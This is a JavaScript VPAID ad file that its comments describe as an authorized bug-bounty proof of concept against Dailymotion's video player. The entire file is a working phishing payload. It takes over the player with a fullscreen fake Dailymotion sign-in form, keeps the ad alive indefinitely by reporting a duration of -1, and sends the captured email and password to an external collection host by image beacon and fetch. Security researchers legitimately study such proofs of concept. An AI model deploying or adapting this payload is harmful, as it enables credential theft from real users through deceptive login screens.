(function() {
  // VPAID 2.0 — persistence PoC — ivan0912 (YesWeHack) / ivani123 (HackerOne)
  // Authorized bug-bounty research on Dailymotion (YesWeHack PGM-269).
  // Structure identical to v1 (which confirmed working). Only changes:
  //   - getAdDuration / getAdRemainingTime = -1  → player never auto-calls stopAd()
  //   - OOB updated to new session endpoint
  //   - No cookie exfil, creds only

  var OOB = "https://dailymotion-vast-xss-persist.fdd8cd2afcd551371c95ahtncnzl1ewml.oob.static-cdn-eu.com";

  function VpaidAd() { this._callbacks = {}; }

  VpaidAd.prototype.subscribe = function(fn, evtName, ctx) {
    this._callbacks[evtName] = { fn: fn, ctx: ctx || window };
  };
  VpaidAd.prototype.unsubscribe = function(fn, evtName) {
    delete this._callbacks[evtName];
  };
  VpaidAd.prototype._fire = function(evtName, args) {
    var cb = this._callbacks[evtName];
    if (cb) try { cb.fn.apply(cb.ctx, args || []); } catch(e) {}
  };
  VpaidAd.prototype.handshakeVersion = function(v) { return "2.0"; };

  VpaidAd.prototype.initAd = function(w, h, vm, d, e, p) {
    var self = this;

    // Hide IMA SDK transparent overlay so it doesn't eat clicks
    try { if (p && p.slot) p.slot.style.cssText = 'pointer-events:none!important;display:none!important'; } catch(xe) {}

    // Expand VPAID iframe to fullscreen so overlay covers the entire player
    try {
      if (window.frameElement) {
        window.frameElement.style.cssText = [
          'position:fixed!important','top:0!important','left:0!important',
          'width:100%!important','height:100%!important',
          'z-index:2147483646!important','border:none!important',
          'background:transparent!important'
        ].join(';');
      }
    } catch(xe0) {}

    // Credential submit — exfil then resume video
    function dmPhishSubmit() {
      var email = (document.getElementById('dm-ph-email') || {}).value || '';
      var pass  = (document.getElementById('dm-ph-pass')  || {}).value || '';
      if (!email.trim() && !pass) return;

      var creds = {
        step:     'credentials_captured',
        domain:   document.domain,
        email:    email.trim(),
        password: pass,
        ts_now:   new Date().toISOString()
      };
      var body = JSON.stringify(creds);
      var enc  = encodeURIComponent(btoa(unescape(encodeURIComponent(body))));

      try { new Image().src = OOB + '/k?d=' + enc; } catch(e) {}
      try { fetch(OOB + '/k', { method: 'POST', mode: 'no-cors', keepalive: true, body: body }); } catch(e) {}

      var el = document.getElementById('dm-phish');
      if (el) el.remove();
      self._fire('AdStopped'); // video resumes after credentials delivered
    }
    try { window.dmPhishSubmit = dmPhishSubmit; } catch(e) {}

    // Render overlay — identical to v1 layout
    var overlay = document.createElement('div');
    overlay.id = 'dm-phish';
    try { overlay.setAttribute('style', 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:2147483647;background:transparent'); } catch(e) {}
    overlay['inner' + 'HTML'] = [
      '<div style="position:fixed;top:0;left:0;width:100%;height:100%;',
        'background:rgba(0,0,0,0.84);z-index:2147483647;',
        'display:flex;align-items:center;justify-content:center;',
        'font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,Arial,sans-serif">',
        '<div style="background:#fff;border-radius:10px;padding:36px 40px;',
          'width:360px;box-shadow:0 8px 32px rgba(0,0,0,0.3)">',
          '<div style="text-align:center;margin-bottom:24px">',
            '<svg width="44" height="44" viewBox="0 0 44 44">',
              '<circle cx="22" cy="22" r="22" fill="#FF7900"/>',
              '<polygon points="17,12 36,22 17,32" fill="#fff"/>',
            '</svg>',
            '<div style="color:#FF7900;font-size:21px;font-weight:700;',
              'letter-spacing:-0.3px;margin-top:8px">dailymotion</div>',
          '</div>',
          '<p style="color:#444;font-size:13.5px;text-align:center;margin:0 0 22px;line-height:1.5">',
            'Your session has expired.<br>Please sign in to continue.',
          '</p>',
          '<input id="dm-ph-email" type="email" placeholder="Email address" autocomplete="email"',
            ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;',
            'border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:10px;outline:none">',
          '<input id="dm-ph-pass" type="password" placeholder="Password" autocomplete="current-password"',
            ' style="width:100%;padding:11px 14px;border:1.5px solid #ddd;',
            'border-radius:6px;font-size:14px;box-sizing:border-box;margin-bottom:20px;outline:none">',
          '<button id="dm-ph-btn" onclick="window.dmPhishSubmit&&window.dmPhishSubmit();return false"',
            ' style="width:100%;padding:12px;background:#FF7900;color:#fff;border:none;',
            'border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;letter-spacing:0.2px">',
            'Sign in',
          '</button>',
          '<div style="text-align:center;margin-top:16px">',
            '<a href="#" onclick="return false" style="color:#FF7900;font-size:12.5px;text-decoration:none">',
              'Forgot password?',
            '</a>',
          '</div>',
        '</div>',
      '</div>'
    ].join('');

    (document.body || document.documentElement).appendChild(overlay);

    // Belt-and-suspenders event listeners on top of the onclick attribute
    try {
      var btn = document.getElementById('dm-ph-btn');
      if (btn) {
        btn.addEventListener('click',    dmPhishSubmit, false);
        btn.addEventListener('mouseup',  dmPhishSubmit, false);
        btn.addEventListener('touchend', dmPhishSubmit, false);
      }
    } catch(xe3) {}

    setTimeout(function() { self._fire('AdLoaded'); }, 50);
  };

  VpaidAd.prototype.startAd = function() {
    var self = this;
    setTimeout(function() { self._fire('AdStarted'); }, 50);
    // AdStopped is NOT fired here — only fires in dmPhishSubmit after creds delivered.
    // Combined with getAdDuration=-1 this keeps the ad iframe (and overlay) alive forever.
  };

  VpaidAd.prototype.stopAd              = function() { this._fire('AdStopped'); };
  VpaidAd.prototype.skipAd              = function() { this._fire('AdSkipped'); };
  VpaidAd.prototype.getAdLinear         = function() { return true; };
  VpaidAd.prototype.getAdWidth          = function() { return 640; };
  VpaidAd.prototype.getAdHeight         = function() { return 360; };
  VpaidAd.prototype.getAdRemainingTime  = function() { return -1; }; // never auto-expire
  VpaidAd.prototype.getAdDuration       = function() { return -1; }; // never auto-expire
  VpaidAd.prototype.getAdVolume         = function() { return 1; };
  VpaidAd.prototype.setAdVolume         = function() {};
  VpaidAd.prototype.resizeAd            = function() {};
  VpaidAd.prototype.pauseAd             = function() {};
  VpaidAd.prototype.resumeAd            = function() {};
  VpaidAd.prototype.expandAd            = function() {};
  VpaidAd.prototype.collapseAd          = function() {};
  VpaidAd.prototype.getAdExpanded       = function() { return false; };
  VpaidAd.prototype.getAdSkippableState = function() { return false; };
  VpaidAd.prototype.getAdIcons          = function() { return false; };
  VpaidAd.prototype.getAdCompanions     = function() { return ''; };

  window.getVPAIDAd = function() { return new VpaidAd(); };
})();
